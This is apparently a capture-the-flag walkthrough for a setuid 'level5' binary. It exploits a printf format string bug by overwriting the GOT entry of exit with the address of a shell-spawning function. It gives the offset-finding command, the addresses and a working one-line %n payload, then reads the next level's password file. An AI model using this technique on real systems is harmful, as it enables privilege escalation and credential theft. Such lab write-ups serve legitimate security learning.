# Level5 Walkthrough

Binary is setuid `level6`. `main` calls `n`:

```c
void o(void) {
  system("/bin/sh");
  _exit(1);
}

void n(void) {
  char buffer[520];

  fgets(buffer, 512, stdin);
  printf(buffer);
  exit(1);
}
```

## Vulnerability

Same format string bug: `printf(buffer)`. There is no global to set this time.
Instead `o()` runs `system("/bin/sh")` but is never called, and `n()` calls
`exit(1)` right after `printf`.

Idea: overwrite the GOT entry of `exit` with the address of `o`, so that the
`exit(1)` call jumps into `o()` instead.

## Exploitation

- Address of `o`: `0x080484a4` (= 134513828) -> the value to write.
- GOT entry of `exit`: `objdump -R level5 | grep exit` -> `0x08049838` -> where to write.
- Offset: `python -c 'print "AAAA" + ".%x"*10' | ./level5` shows `41414141` at the 4th position.

Write `0x080484a4` into the `exit` GOT entry with `%n`. Field width =
`134513828 - 4 = 134513824`.

```sh
(python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"'; cat) | ./level5
```

`exit(1)` now jumps to `o()` -> `system("/bin/sh")`.

```sh
whoami            # level6
cat /home/user/level6/.pass
```

